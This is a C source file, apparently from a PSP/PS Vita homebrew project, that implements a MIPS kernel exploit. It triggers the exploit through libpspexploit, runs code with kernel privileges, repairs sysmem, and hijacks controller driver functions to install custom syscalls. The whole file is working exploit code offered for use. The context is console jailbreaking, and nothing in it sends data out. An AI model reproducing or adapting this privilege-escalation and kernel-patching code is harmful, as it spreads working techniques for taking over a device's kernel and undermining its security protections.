/* mips.c -- implementation of the mips kernel exploit
 *
 * Copyright (C) 2019 TheFloW
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

#include <pspsdk.h>
#include <pspkernel.h>
#include <psputility.h>

#include <stdio.h>
#include <string.h>

#include "mips.h"
#include "rpc.h"

#include <libpspexploit.h>

int sceNpCore_8AFAB4A0(int *input, char *string, int length);

void (* _sceKernelIcacheInvalidateAll)(void);
void (* _sceKernelDcacheInvalidateRange)(const void *p, unsigned int size);
void (* _sceKernelDcacheWritebackInvalidateAll)(void);

int (* _sceMeRequest)(int cmd, ...);

int (* _sceKermitRequest)(KermitRequest *request, int mode, int cmd, int argc, int is_callback, u64 *resp);
int (* _sceKermitMemoryArgument)(KermitRequest *request, int arg, const void *data, int size, int mode);

static int kernel_function(void) {
  int k1 = pspSdkSetK1(0);
  int intc = pspSdkDisableInterrupts();

  // Find functions
  _sceKernelIcacheInvalidateAll = (void *)pspXploitFindFunction("sceSystemMemoryManager", "UtilsForKernel", 0x920F104A);
  _sceKernelDcacheInvalidateRange = (void *)pspXploitFindFunction("sceSystemMemoryManager", "UtilsForKernel", 0xBFA98062);
  _sceKernelDcacheWritebackInvalidateAll = (void *)pspXploitFindFunction("sceSystemMemoryManager", "UtilsForKernel", 0xB435DEC5);
  _sceMeRequest = (void *)pspXploitFindFunction("sceMeCodecWrapper", "sceMeCore_driver", 0xFA398D71);
  _sceKermitRequest = (void *)pspXploitFindFunction("sceKermit_Driver", "sceKermit_driver", 0x4F75AA05);
  if (!_sceKermitRequest)
    _sceKermitRequest = (void *)pspXploitFindFunction("sceKermit_Driver", "sceKermit_driver", 0x36666181);
  _sceKermitMemoryArgument = (void *)pspXploitFindFunction("sceLowIO_Driver", "sceKermitMemory_driver", 0xAAF047AC);

  // Repair sysmem
  pspXploitRepairKernel();

  // Install syscalls
  REDIRECT_FUNCTION(pspXploitFindFunction("sceController_Service", "sceCtrl", 0x3A622550), _read_native);
  REDIRECT_FUNCTION(pspXploitFindFunction("sceController_Service", "sceCtrl", 0xC152080A), _syscall);
  REDIRECT_FUNCTION(pspXploitFindFunction("sceController_Service", "sceCtrl", 0x1F803938), _call);
  REDIRECT_FUNCTION(pspXploitFindFunction("sceController_Service", "sceCtrl", 0x60B81F86), _init_rpc);
  _sceKernelIcacheInvalidateAll();
  _sceKernelDcacheWritebackInvalidateAll();

  pspSdkEnableInterrupts(intc);
  pspSdkSetK1(k1);
  return 0;
}

int exploit_mips_kernel(void) {
  int res;

  pspXploitConfigure(&kreader_netmcopyback, &kwriter_fakeuid);

  res = pspXploitInitKernelExploit();
  if (res < 0)
    return res;

  res = pspXploitDoKernelExploit();
  if (res < 0)
    return res;

  pspXploitExecuteKernel((void*)&kernel_function);
  return 0;
}
